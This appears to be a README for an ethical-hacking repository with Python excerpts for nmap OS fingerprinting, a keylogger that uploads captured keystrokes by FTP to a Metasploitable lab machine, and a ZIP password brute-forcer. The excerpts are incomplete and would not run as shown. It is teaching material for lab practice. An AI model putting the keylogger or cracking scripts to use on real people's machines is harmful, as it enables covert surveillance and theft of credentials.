# Ethical Hacking with Python

Ethical Hacking refers to the process of performing attacks on computer systems and networks to discover potential security weaknesses and help clients improve their security. It is common for ethical hackers to automate structured processes by writing their own scripts.

Python is a widely-used general-purpose, open-source, object-oriented HLL with libraries that can be used for hacking, making it ideal for implementing automation. Python's large community makes doubt resolution fast and easy.

This repository contains python3 scripts for automating basic tasks such as [OS fingerprinting](#os-fingerprinting), [keylogging](#keylogging), and [brute-forcing protected passwords](#bruteforce-protected-passwords). All instructions regarding customization have been provided in the scripts themselves.

## OS Fingerprinting

OS fingerprinting is the process of determining the operating system running on a system. By determining the OS of a system, tailor-made attacks can be launched against the target using known vulnerabilities.

In this script, the python3-nmap library has been used to bring the functionalities of Nmap to Python. Nmap is an open-source security auditing and network mapping tool that can "detect or diagnose services that are running on an Internet-connected system by a network administrator in their networked system". For more information, visit

https://nmap.org/book/osdetect-fingerprint-format.html

### Installation

```bash
pip install python3-nmap
```

### Usage

```python
import nmap    # import the nmap module
import sys     # import the sys module
import time    # import the time module

nm_scan = nmap.PortScanner() # initialise the Nmap PortScanner object for scanning
nm_scanner= nm_scan.scan(sys.argv[1],'80',arguments='-O')    # scan port 80 of target IP obtained using sys.argv[1]
with open("%s.txt"%sys.argv[1], 'w') as f:
    f.write(host_status+port_status+scan_method+os_guess)
    f.write("\nReport generated at: "+time.strftime("%Y-%m-%d_%H:%M:%S GMT", time.gmtime())) # generate timestamp
```

To run the script, open a terminal in the current directory and enter 

```bash
python os_fingerprint.py <target IP>
```

Here, <target IP> will be replaced by your target's IP address, and utilized as sys.argv[1] in the script. Before running the script, update the Environment Variables on your system

## Keylogging

Keystroke loggers, or keyloggers, are pieces of software that can log (and thus, track) the keys being pressed on a keyboard, in order to monitor the actions of the target.

In this script, pynput.keyboard, ftplib and logging modules of Python have been used to create a keylogger, store its results, and integrate FTP into it. No additional installations are required, as these modules are built-in.

The pynput package can control and monitor input devices, as explained on

https://pynput.readthedocs.io/en/latest/keyboard.html

File Transfer Protocol (FTP) is an internet protocol provided by TCP/IP used for transmitting files from one host to another. The ftplib module is used to implement the client side of the FTP protocol. For more information, visit

https://docs.python.org/3/library/ftplib.html

The logging module allows writing status messages to output streams such as files. Read about it on

https://docs.python.org/3/library/logging.html

### Usage

```python
from pynput.keyboard import Key, Listener   # import Key and Listener modules from pynput.keyboard package
import ftplib                               # import the ftplib module
import logging                              # import the logging module

def onKeyPress(Key):
    try:
        logging.info(str(Key)) # creates a definition for keypresses and takes the key as a parameter

sess= ftplib.FTP("", "", "")    # creates a new instance of the FTP class and makes a connection when host is provided
                                # insert target IP, username, password
```

In this script, a metasploitable machine is used as the FTP server where the file with the pressed keys exist. The IP address of the machine needs to be the same as the address in the script. To setup a metasploitable machine, follow this tutorial:

https://www.thesecuritygeeks.com/security/install-metasploitable-2-in-virtual-box/

The default username and password are "msfadmin". The machine's IP address can be found out by running the "ifconfig" command on it. Make sure your virtual machine is online before running this script on your local machine.

After the script has finished running, run the "ls -a" command on the virtual machine to check if the keylogger results have been shared with it or not. The original .txt file will be in the same directory as the script, on your local machine, and its copy should be present in the metasploitable machine.

## Bruteforce Protected Passwords

Bruteforcing is the process of attacking static parameters with several parameters to compare and match. Here, the parameter will be a protected password. This script uses the zipfile and argparse python modules for this process.

The zipfile module facilitates the creating, extracting, reading and writing to ZIP archives. The ZipFile() function returns a string or file object. For details, visit

https://docs.python.org/3/library/zipfile.html

The argparse module improves interaction by generating help, usage and error messages according to command-line arguments entered by the user. To see how this works, check

https://docs.python.org/3/library/argparse.html

### Usage

```python
from zipfile import ZipFile  # import the ZipFile module
import argparse              # import the argparse module

parser= argparse.ArgumentParser(description="\nUsage: python <brutefile.py> -z <zipfile.zip> -p <passwordfile.txt>")
parser.add_argument("-z", dest="ziparchive", help="Zip archive file")
parser.add_argument("-p", dest="passfile", help="Password file")
parsed_args= parser.parse_args()
ziparchive= ZipFile(parsed_args.ziparchive)

# Replace <brutefile.py> with the program name, <zipfile.py> with the target and <passwordfile.txt> with the list of passwords 
# -z and -p are arguments for ZipFile()
```
